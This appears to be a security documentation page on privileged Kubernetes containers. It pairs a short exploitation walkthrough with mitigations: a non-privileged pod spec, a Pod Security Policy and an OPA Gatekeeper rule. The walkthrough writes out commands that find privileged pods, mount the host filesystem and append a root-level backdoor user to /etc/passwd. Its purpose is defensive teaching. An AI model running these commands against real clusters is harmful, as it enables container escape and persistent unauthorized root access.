---
sidebar_position: 3
title: Privileged Containers
description: Understanding the risks of privileged containers in Kubernetes and implementing best practices to secure workloads.
---

# Privileged Containers

Privileged containers run with elevated permissions, granting them access to the host system's resources. This configuration can lead to severe security risks, including the ability to modify the host file system, access hardware devices, and escalate privileges to the host.

---

## Exploitation Steps: Privileged Container

An attacker identifies a privileged container in the Kubernetes cluster using kubectl:

```bash
kubectl get pods -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged == true) | .metadata.name'
```

### 1. Gain Host Access via Privileged Container

The attacker can execute commands as root on the host system:

```bash
kubectl exec -it <privileged-pod> -- /bin/sh
```

### 2. Mount the Host File System

The attacker mounts the host's root file system to the privileged container:

```bash
mkdir /mnt/host
mount -o bind / /mnt/host
cd /mnt/host
ls -al
```

### 3. Create a Backdoor

The attacker adds a malicious user to the host /etc/passwd file, creating a backdoor:

```bash
echo 'malicious_user:x:0:0:root:/root:/bin/bash' >> /mnt/host/etc/passwd
```

### Result

The attacker gains persistent access to the host system, allowing them to execute commands as root, manipulate files, and bypass container isolation.

---

## Mitigation Techniques and Fixes

### 1. Avoid Running Privileged Containers

**Issue:** Privileged containers can bypass security boundaries and access the host.<br/>
**Fix:** Set **privileged: false** in the **PodSecurityContext**.

#### Example Pod Configuration

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: non-privileged-pod
spec:
  containers:
  - name: app-container
    image: nginx
    securityContext:
      privileged: false
```

### 2. Use Pod Security Standards (PSS)

**Issue:** Lack of security policies allows privileged containers to run.<br/>
**Fix:** Enforce **Pod Security Policies (PSP)** or **Pod Security Standards (PSS)**.

#### Example of a Restricted Pod Security Policy

```yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted-psp
spec:
  privileged: false
  runAsUser:
    rule: MustRunAsNonRoot
  allowPrivilegeEscalation: false
  volumes:
    - configMap
    - emptyDir
    - projected
    - secret
    - downwardAPI
  seLinux:
    rule: RunAsAny
```

### 3. Implement Admission Controllers

**Issue:** Privileged containers can be created without restriction.<br/>
**Fix:** Use **admission controllers** to **block privileged containers**.

#### Example Using OPA Gatekeeper Policy

```yaml
apiVersion: templates.gatekeeper.sh/v1beta1
kind: ConstraintTemplate
metadata:
  name: k8sprivilegedcontainer
spec:
  crd:
    spec:
      names:
        kind: K8sPrivilegedContainer
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sprivilegedcontainer

        violation[{"msg": msg}] {
          input.review.object.spec.containers[_].securityContext.privileged == true
          msg := "Privileged containers are not allowed"
        }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPrivilegedContainer
metadata:
  name: deny-privileged-containers
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
```

---

## Conclusion

To mitigate risks associated with privileged containers:

- Disable privileged mode by setting **privileged: false** in the **securityContext**.
- Enforce **Pod Security Standards (PSS)** to restrict **risky configurations**.
- Use **admission controllers** to **prevent privileged container deployments**.
